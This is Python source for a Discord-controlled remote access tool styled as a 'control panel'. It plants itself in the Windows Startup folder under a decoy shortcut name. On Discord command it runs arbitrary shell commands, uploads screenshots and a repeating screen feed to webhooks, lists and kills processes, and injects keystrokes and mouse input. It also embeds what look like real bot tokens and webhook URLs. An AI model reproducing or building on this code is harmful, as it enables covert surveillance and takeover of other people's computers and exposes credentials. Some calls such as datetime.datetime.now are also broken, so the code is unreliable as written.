# MTQ4OTM4MTQzODE5MjM1MzQ5MA.GfiUAd.cgpxbRDsn3TnYNPclGTcyojDcUVjhnEr5Dq2Pw
import asyncio, time, socket, platform, sys, subprocess, datetime, pyautogui, keyboard, requests, discord, os, mss, mss.tools, threading, psutil, win32gui, win32process, queue
from datetime import datetime
from pynput.keyboard import Key, Controller
from discord.ext import commands
from PIL import Image
from win32com.client import Dispatch

def start_logah():
    import logah
    logah.start()

def start_online_offline():
    import online_offline
    online_offline.start()

def start_port():
    import port
    port.start()

def start_snippingtool():
    import snippingtool
    snippingtool.start()

if __name__ == "__main__":
    threading.Thread(target=start_logah).start()
    threading.Thread(target=start_online_offline).start()
    threading.Thread(target=start_port).start()
    threading.Thread(target=start_snippingtool).start()



# =========================
# CONFIGURATION
# =========================

BOT_TOKEN = "MTQ4OTM4MTQzODE5MjM1MzQ5MA.GpBW-O.lwtjetaZXUyIWXzvj5cWFQf0RTCqCOm5Yredac"

INPUT_CHANNEL_ID = 1489380428228857936
MASTER_CHANNEL_ID = 1489380091770441798

WEBHOOKS = {
    "status": "https://discord.com/api/webhooks/1489379065570787469/fhf7gOfxZq02C59Iv30u70eSPK8pTY-SJOv5SXVwLLkabmrlZjow4WQ4PAHUccTYEPHK",
    "actions": "https://discord.com/api/webhooks/1489379215303249992/4ekDvbTd9VSJlLmY2Uc_2lgGwZ0wZZEtfO04LCAS9A0NCYjxmvVEfeBL1A6c6Y8Yu2LP",
    "control": "https://discord.com/api/webhooks/1489379412099993773/6LYL-sjiCknk6m1PVWiKjQucvg2mYl0ykNWlr4-ZBm61CEdXW5AmPWsj6pOPe7P04098",
    "network": "https://discord.com/api/webhooks/1489379496606830623/LbXXhCU7m5zwSgxW9IM_rfJTDgIBFLbX8I4-ivpahNyMC0NvE9yWGG9uPY3xO8qstgNC",
    "files": "https://discord.com/api/webhooks/1489379579024900296/vVv_0KfJ3VUjDa1GeFcAt4a0xT3SFPjuDaaYbc3cqFZ0t3bzuYVvXNI6QOiJQ3EIO4my",
    "fun": "https://discord.com/api/webhooks/1489379667407536360/pnTMwYopfabSdOtyv3CPpypGLO1jM6DPXD8WX6ZBMQTldtXSy_o4iIN0JHfjN4KvOXoS",
}

MASTER_FEED_WEBHOOK = "https://discord.com/api/webhooks/1489380112792293427/Dvc4Slbe9Eic0WXwf4Dad3r461Px9k9b-NAgJEtGnp7PoU9ATeceuDz9nvcTMuK0iX-L"

hostname = socket.gethostname()
SCRIPT_START_TIME = time.time()
HEARTBEAT_INTERVAL = 60
_last_online_state = None
keyboard = Controller()
screenshare_running = False
screenshare_thread = None

# =========================
# STARTUP MOVE
# =========================

# SHORTCUT SETUP
def create_shortcut(target, shortcut_path, description=""):
    shell = Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = sys.executable # Use current python.exe
    shortcut.Arguments = f'"{target}"'    # Run this script
    shortcut.WorkingDirectory = os.path.dirname(target)
    shortcut.Description = description
    shortcut.save()

# Pathing
target_file = os.path.abspath(__file__) # Points to THIS file
startup_dir = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")
path_to_save = os.path.join(startup_dir, "poologs.lnk")

# Only create it if it doesn't exist to avoid redundant writes
if not os.path.exists(path_to_save):
    create_shortcut(target_file, path_to_save, "Flashes on startup")



# =========================
# HELPER FUNCTIONS
# =========================

def take_multi_monitor_screenshot():


    folder = "screenshots"
    os.makedirs(folder, exist_ok=True)

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filepath = f"{folder}/screenshot_{timestamp}.png"

    with mss.mss() as sct:
        monitors = sct.monitors  # monitor[0] = virtual screen, monitor[1..] = real monitors

        # Compute bounding box of all monitors
        min_x = min(m["left"] for m in monitors[1:])
        min_y = min(m["top"] for m in monitors[1:])
        max_x = max(m["left"] + m["width"] for m in monitors[1:])
        max_y = max(m["top"] + m["height"] for m in monitors[1:])

        total_width = max_x - min_x
        total_height = max_y - min_y

        # Create blank canvas
        final_img = Image.new("RGB", (total_width, total_height))

        # Capture each monitor and paste into canvas
        for m in monitors[1:]:
            img = Image.frombytes(
                "RGB",
                (m["width"], m["height"]),
                sct.grab(m).rgb
            )
            final_img.paste(img, (m["left"] - min_x, m["top"] - min_y))

        final_img.save(filepath)

    return filepath


def screenshare_loop(interval, webhook_url):
    global screenshare_running
    import time

    while screenshare_running:
        filepath = take_multi_monitor_screenshot()

        with open(filepath, "rb") as f:
            requests.post(webhook_url, files={"file": f})

        time.sleep(interval)


def send_webhook(channel_key: str, message: str):
    """Send to category channel + mirror to master feed."""
    url = WEBHOOKS.get(channel_key)
    if url:
        try:
            requests.post(url, json={"content": message}, timeout=5)
        except:
            pass

    # Mirror to master feed
    try:
        requests.post(
            MASTER_FEED_WEBHOOK,
            json={"content": f"[{channel_key}] {message}"},
            timeout=5
        )
    except:
        pass


def ping_test() -> bool:
    try:
        requests.get("https://1.1.1.1", timeout=2)
        return True
    except:
        return False


def is_online() -> bool:
    return ping_test()


def format_uptime() -> str:
    seconds = int(time.time() - SCRIPT_START_TIME)
    days, seconds = divmod(seconds, 86400)
    hours, seconds = divmod(seconds, 3600)
    minutes, seconds = divmod(seconds, 60)
    parts = []
    if days: parts.append(f"{days}d")
    if hours: parts.append(f"{hours}h")
    if minutes: parts.append(f"{minutes}m")
    parts.append(f"{seconds}s")
    return " ".join(parts)


def get_status_message() -> str:
    online = is_online()
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    uptime = format_uptime()
    return (
        f"📡 Status for **{hostname}** at `{ts}`\n"
        f"• Online: **{online}**\n"
        f"• Uptime: `{uptime}`"
    )


# =========================
# DISCORD BOT SETUP
# =========================

intents = discord.Intents.default()
intents.message_content = True

bot = discord.Client(intents=intents)


@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} on {hostname}")
    bot.loop.create_task(heartbeat_task())
    send_webhook("status", f"🟢 **{hostname}** script started.")


# =========================
# HEARTBEAT TASK
# =========================

async def heartbeat_task():
    global _last_online_state
    while True:
        online = is_online()
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        uptime = format_uptime()

        if _last_online_state is None:
            _last_online_state = online
            send_webhook("status", f"🔄 Initial network state: **{online}**")

        elif online != _last_online_state:
            if online:
                send_webhook("status", f"🟢 Reconnected at `{ts}`")
            else:
                send_webhook("status", f"🔴 Lost connection at `{ts}`")
            _last_online_state = online

        send_webhook(
            "status",
            f"💙 Heartbeat at `{ts}`\n• Online: **{online}**\n• Uptime: `{uptime}`"
        )

        await asyncio.sleep(HEARTBEAT_INTERVAL)


# =========================
# COMMAND HANDLER
# =========================

@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return

    if message.channel.id not in (INPUT_CHANNEL_ID, MASTER_CHANNEL_ID):
        return

    content = message.content.strip()

    # =========================
    # SYSTEM INFO COMMANDS
    # =========================

    if content == "!status":
        send_webhook("status", get_status_message())

    elif content == "!uptime":
        send_webhook("status", f"⏱ Uptime: `{format_uptime()}`")

    elif content == "!os":
        send_webhook("status", f"🖥 OS: `{platform.platform()}`")

    elif content == "!hostname":
        send_webhook("status", f"💻 Hostname: `{hostname}`")

    elif content == "!python":
        send_webhook("status", f"🐍 Python: `{sys.version.split()[0]}`")

    elif content == "!date":
        send_webhook("status", f"📅 Date: `{datetime.now().strftime('%Y-%m-%d')}`")

    elif content == "!heartbeat":
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        send_webhook("status", f"💙 Manual heartbeat at `{ts}`")

    # =========================
    # FUN / UTILITY COMMANDS
    # =========================

    elif content == "!hello":
        send_webhook("fun", f"👋 Hello from **{hostname}**")

    elif content == "!time":
        send_webhook("fun", f"⏰ Time: `{datetime.now().strftime('%H:%M:%S')}`")

    elif content == "!roll":
        import random
        send_webhook("fun", f"🎲 You rolled **{random.randint(1,6)}**")

    elif content == "!flip":
        import random
        send_webhook("fun", f"🪙 {random.choice(['Heads','Tails'])}")

    elif content.startswith("!echo "):
        send_webhook("fun", f"🔊 {content[6:].strip()}")

    elif content == "!8ball":
        import random
        answers = [
            "Yes", "No", "Definitely", "Absolutely not",
            "Ask again later", "Uncertain", "Probably", "Doubtful"
        ]
        send_webhook("fun", f"🎱 {random.choice(answers)}")

    elif content == "!about":
        send_webhook("fun", "🤖 Control Panel Bot — safe & running smoothly.")


    # =========================
    # CUSTOM COMMANDS (souper fun)
    # =========================

    elif content.startswith("!cmd"):
        parts = content.split(" ", 1)

        if len(parts) == 1:
            send_webhook("fun", "❗ Usage: `!cmd <value>`")
        else:
            value = parts[1].strip()
            send_webhook("fun", f"📦 Command received: `{value}`")
            
            result = subprocess.check_output(value, shell=True, text=True)
            print(result)
            send_webhook("fun", f"📦 Command executed... Output: `{result}`")

    elif content.startswith("!type"):
        words = content.split(" ", 1)

        if len(words) == 1:
            send_webhook("fun", "❗ Usage: `!type <text>`")
        else:
            text_to_type = words[1].strip()
            send_webhook("fun", f"📨 Command received: `{text_to_type}`")
            pyautogui.write(text_to_type, interval=0.05)
            send_webhook("fun", "📦 Typing complete.")
    
    elif content.startswith("!combo"):
        parts = content.split(" ", 1)

        if len(parts) == 1:
            send_webhook("fun", "❗ Usage: `!combo <keys>`\nExample: `!combo ctrl+c`")
        else:
            combo = parts[1].strip()
            send_webhook("fun", f"📨 Combo received: `{combo}`")

            from pynput.keyboard import Key, Controller
            keyboard = Controller()

            # Split combo like "ctrl+c" into ["ctrl", "c"]
            keys = combo.lower().split("+")

            # Mapping text → pynput keys
            keymap = {
                "ctrl": Key.ctrl,
                "shift": Key.shift,
                "alt": Key.alt,
                "enter": Key.enter,
                "tab": Key.tab,
                "space": Key.space,
                "esc": Key.esc,
                "up": Key.up,
                "down": Key.down,
                "left": Key.left,
                "right": Key.right,
            }

            pressed = []
            for k in keys:
                if k in keymap:
                    keyboard.press(keymap[k])
                    pressed.append(keymap[k])
                else:
                    keyboard.press(k)
                    pressed.append(k)

            # Release all keys
            for k in pressed:
                keyboard.release(k)

            send_webhook("fun", "📦 Combo executed.")
    
    elif content.startswith("!spam"):
        parts = content.split(" ", 2)

        if len(parts) < 3:
            send_webhook("fun", "❗ Usage: `!spam <count> <text>`")
        else:
            count_str = parts[1]
            text = parts[2]

            # Validate count
            if not count_str.isdigit():
                send_webhook("fun", "❗ Count must be a number.")
                return

            count = int(count_str)

            send_webhook("fun", f"📨 Spam command received: `{text}` x{count}")

            for _ in range(count):
                pyautogui.write(text)
                pyautogui.press("enter")  # optional — remove if you don’t want newlines

            send_webhook("fun", "📦 Spam complete.")
    elif content.startswith("!mouse"):
        parts = content.split(" ")

        if len(parts) < 2:
            send_webhook("fun", "❗ Usage: `!mouse <action>`\nActions: move, move_rel, click, double, scroll, drag")
            return

        action = parts[1].lower()

        from pynput.mouse import Button, Controller
        mouse = Controller()

        # MOVE ABSOLUTE
        if action == "move" and len(parts) == 4:
            x = int(parts[2])
            y = int(parts[3])
            mouse.position = (x, y)
            send_webhook("fun", f"🖱️ Moved mouse to ({x}, {y})")

        # MOVE RELATIVE
        elif action == "move_rel" and len(parts) == 4:
            dx = int(parts[2])
            dy = int(parts[3])
            mouse.move(dx, dy)
            send_webhook("fun", f"🖱️ Moved mouse by ({dx}, {dy})")

        # CLICK
        elif action == "click" and len(parts) == 3:
            btn = parts[2].lower()
            button = Button.left if btn == "left" else Button.right
            mouse.click(button, 1)
            send_webhook("fun", f"🖱️ Clicked {btn}")

        # DOUBLE CLICK
        elif action == "double" and len(parts) == 3:
            btn = parts[2].lower()
            button = Button.left if btn == "left" else Button.right
            mouse.click(button, 2)
            send_webhook("fun", f"🖱️ Double‑clicked {btn}")

        # SCROLL
        elif action == "scroll" and len(parts) == 3:
            amount = int(parts[2])
            mouse.scroll(0, amount)
            send_webhook("fun", f"🖱️ Scrolled {amount}")

        # DRAG
        elif action == "drag" and len(parts) == 4:
            x = int(parts[2])
            y = int(parts[3])
            mouse.press(Button.left)
            mouse.position = (x, y)
            mouse.release(Button.left)
            send_webhook("fun", f"🖱️ Dragged to ({x}, {y})")

        else:
            send_webhook("fun", "❗ Invalid mouse command or wrong arguments.")
        

    elif content.startswith("!screenshot"):
        folder = "screenshots"
        os.makedirs(folder, exist_ok=True)

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filepath = f"{folder}/screenshot_{timestamp}.png"

        with mss.mss() as sct:
            monitors = sct.monitors  # monitor[0] = full virtual screen, monitor[1..] = individual

            # Get bounding box of ALL monitors
            min_x = min(m["left"] for m in monitors[1:])
            min_y = min(m["top"] for m in monitors[1:])
            max_x = max(m["left"] + m["width"] for m in monitors[1:])
            max_y = max(m["top"] + m["height"] for m in monitors[1:])

            total_width = max_x - min_x
            total_height = max_y - min_y

            # Create blank canvas
            final_img = Image.new("RGB", (total_width, total_height))

            # Capture each monitor and paste it into the canvas
            for m in monitors[1:]:
                img = Image.frombytes(
                    "RGB",
                    (m["width"], m["height"]),
                    sct.grab(m).rgb
                )
                final_img.paste(img, (m["left"] - min_x, m["top"] - min_y))

            final_img.save(filepath)

        # Upload to Discord
        webhook = WEBHOOKS["actions"]
        with open(filepath, "rb") as f:
            requests.post(webhook, files={"file": f})

        send_webhook("actions", "📸 Multi-monitor screenshot captured and uploaded.")

    elif content.startswith("!screenshare"):
        global screenshare_running, screenshare_thread


        parts = content.split(" ")

        # STOP
        if len(parts) >= 2 and parts[1].lower() == "stop":
            screenshare_running = False
            send_webhook("actions", "🛑 Screenshare stopped.")
            return

        # START
        if len(parts) >= 3 and parts[1].lower() == "start":
            try:
                interval = float(parts[2])
            except:
                send_webhook("actions", "❗ Usage: `!screenshare start <seconds>`")
                return

            if screenshare_running:
                send_webhook("actions", "⚠️ Screenshare already running.")
                return

            screenshare_running = True

            # Start thread
            
            screenshare_thread = threading.Thread(
                target=screenshare_loop,
                args=(interval, WEBHOOKS["actions"]),
                daemon=True
            )
            screenshare_thread.start()

            send_webhook("actions", f"📡 Screenshare started (every {interval}s).")
            return

        send_webhook("actions", "❗ Usage: `!screenshare start <seconds>` or `!screenshare stop`")

    elif content.startswith("!processes"):
        

        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                processes.append(f"{proc.info['name']} (PID {proc.info['pid']})")
            except:
                pass

        processes = processes[:50]  # limit output

        send_webhook("actions", "🧩 **Running Processes (first 50):**\n" + "\n".join(processes))

    elif content.startswith("!windowlist"):
        
        windows = []

        def callback(hwnd, _):
            title = win32gui.GetWindowText(hwnd)
            if title:
                windows.append(title)

        win32gui.EnumWindows(callback, None)

        windows = windows[:50]  # limit output

        send_webhook("actions", "🪟 **Open Windows (first 50):**\n" + "\n".join(windows))

    elif content.startswith("!kill"):
        parts = content.split(" ", 1)

        if len(parts) == 1:
            send_webhook("actions", "❗ Usage: `!kill <app to kill>`")
            return
    
        app = parts[1].strip().lower()
        matches = []

        def callback(hwnd, _):
            title = win32gui.GetWindowText(hwnd)
            if title and app in title.lower():
                try:
                    _, pid = win32process.GetWindowThreadProcessId(hwnd)
                    proc = psutil.Process(pid)
                    matches.append(f"{title}  →  {proc.name()} (PID {pid})")
                    actual_app = proc.name()
                    subprocess.call(["taskkill", "/F", "/IM", actual_app])
                except:
                    pass
        win32gui.EnumWindows(callback, None)

        if matches:
            
            send_webhook("actions", "🔍 **Matching Windows:**\n" + "\n".join(matches))
            
        else:
            send_webhook("actions", f"🔍 No windows found containing: `{app}`")
        
    elif content.startswith("!windowsearch"):

        parts = content.split(" ", 1)
        if len(parts) == 1:
            send_webhook("control", "❗ Usage: `!windowsearch <keyword>`")
            return

        keyword = parts[1].strip().lower()
        matches = []

        def callback(hwnd, _):
            title = win32gui.GetWindowText(hwnd)

            # Skip empty titles
            if not title:
                return

            # Check if keyword matches window title
            if keyword in title.lower():
                try:
                    # Get PID from window handle
                    _, pid = win32process.GetWindowThreadProcessId(hwnd)

                    # Get process name safely
                    proc = psutil.Process(pid)
                    exe_name = proc.name()

                    matches.append(f"{title}  →  {exe_name} (PID {pid})")

                except Exception:
                    # Some windows have no accessible PID — skip them safely
                    pass

        win32gui.EnumWindows(callback, None)

        if matches:
            send_webhook("control", "🔍 **Matching Windows:**\n" + "\n".join(matches))
        else:
            send_webhook("control", f"🔍 No windows found containing: `{keyword}`")

    

    # =========================
    # NETWORK DIAGNOSTICS
    # =========================

    elif content == "!net":
        send_webhook("network", f"🌐 Online: **{is_online()}**")

    elif content.startswith("!dns "):
        domain = content.split(" ", 1)[1].strip()
        try:
            ip = socket.gethostbyname(domain)
            send_webhook("network", f"🌐 `{domain}` → `{ip}`")
        except:
            send_webhook("network", f"❌ DNS lookup failed for `{domain}`")

    elif content == "!latency":
        try:
            start = time.time()
            requests.get("https://1.1.1.1", timeout=3)
            ms = int((time.time() - start) * 1000)
            send_webhook("network", f"⚡ Latency: `{ms} ms`")
        except:
            send_webhook("network", "❌ Latency test failed")

    elif content == "!ip":
        try:
            ip = requests.get("https://api.ipify.org", timeout=3).text
            send_webhook("network", f"🌍 Public IP: `{ip}`")
        except:
            send_webhook("network", "❌ Could not fetch public IP")

    elif content.startswith("!clip"):
        from pynput.keyboard import Key, Controller
        keyboard = Controller()

        keyboard.press(Key.print_screen)
        keyboard.release(Key.print_screen)

        send_webhook("fun", "📸 Full-screen screenshot copied to clipboard.")


    # =========================
    # CONTROL PANEL META COMMANDS
    # =========================

    elif content == "!help":
        help_text = (
            "```\n"
            "╔════════════════════════════════════════════════════╗\n"
            "║-----------------LOGAH CONTROL PANEL----------------║\n"
            "╚════════════════════════════════════════════════════╝\n"
            "```\n"

            "## 🛠 SYSTEM & STATUS\n"
            "• `!status` — Full system status\n"
            "• `!uptime` — Script uptime\n"
            "• `!net` — Online/offline check\n"
            "• `!heartbeat` — Manual heartbeat ping\n"
            "\n"

            "## 🖥 SCREEN & DESKTOP\n"
            "• `!screenshot` — Capture all monitors\n"
            "• `!screenshare start <seconds>` — Start live feed\n"
            "• `!screenshare stop` — Stop live feed\n"
            "\n"

            "## 🪟 WINDOWS & PROCESSES\n"
            "• `!windowlist` — List open windows\n"
            "• `!windowsearch <keyword>` — Search windows by title\n"
            "• `!processes` — List running processes\n"
            "• `!kill <app>` — Kills app\n"
            
            "\n"

            "## 📡 NETWORK & INFO\n"
            "• `!ip` — Show local IP\n"
            "• `!publicip` — Show public IP\n"
            "\n"

            "## 🎉 FUN & MISC\n"
            "• `!hello` — Say hello\n"
            "• `!time` — Current system time\n"
            "• `!cmd <command>` — Run a terminal command\n"
            "\n"

            "## ⌨️ KEYBOARD CONTROL\n"
            "• `!type <text>` — Type text\n"
            "• `!press <key>` — Press a key\n"
            "• `!combo <ctrl+shift+x>` — Key combo\n"
            "• `!spam <text> <count>` — Spam text\n"
            "• `!spamcombo <combo> <count>` — Spam key combo\n"
            "\n"

            "## 🖱️ MOUSE CONTROL\n"
            "• `!mouse move <x> <y>` — Move to position\n"
            "• `!mouse move_rel <dx> <dy>` — Move relative\n"
            "• `!mouse click <left/right>` — Click\n"
            "• `!mouse double <left/right>` — Double‑click\n"
            "• `!mouse scroll <amount>` — Scroll (10 up, -10 down)\n"
            "• `!mouse drag <x> <y>` — Drag to position\n"
            "\n"

            "## ⚙ CONTROL PANEL\n"
            "• `!help` — Show this help menu\n"
        )

        send_webhook("control", help_text)


    elif content == "!commands":
        send_webhook("control",
            "📜 Commands: system info, fun, network, control — use `!help` for details."
        )

    elif content == "!channels":
        send_webhook("control",
            f"🎧 Listening:\n• Input: `{INPUT_CHANNEL_ID}`\n• Master: `{MASTER_CHANNEL_ID}`"
        )

    elif content == "!webhooks":
        mapping = "\n".join([f"• {k}: {v}" for k, v in WEBHOOKS.items()])
        send_webhook("control", f"🔗 Webhooks:\n{mapping}")

    elif content == "!version":
        send_webhook("control", "🧩 Script Version: `1.0.0`")



# =========================
# ENTRY POINT
# =========================

if __name__ == "__main__":
    bot.run(BOT_TOKEN)


